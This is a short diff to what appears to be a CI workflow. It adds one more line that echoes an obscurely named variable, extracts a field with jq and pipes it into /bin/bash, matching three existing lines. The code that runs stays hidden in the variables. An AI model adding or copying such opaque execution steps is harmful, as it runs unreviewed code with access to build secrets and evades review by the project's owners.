@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$ss4559" | jq -r .c72 | /bin/bash
           echo $yvqkl0111 | jq -r .rhhe182 | /bin/bash
           echo $aqz57 | jq -r .czqc9487 | /bin/bash
+          echo $sw928 | jq -r .t0315 | /bin/bash
 
       - name: Save archive
         if: always()
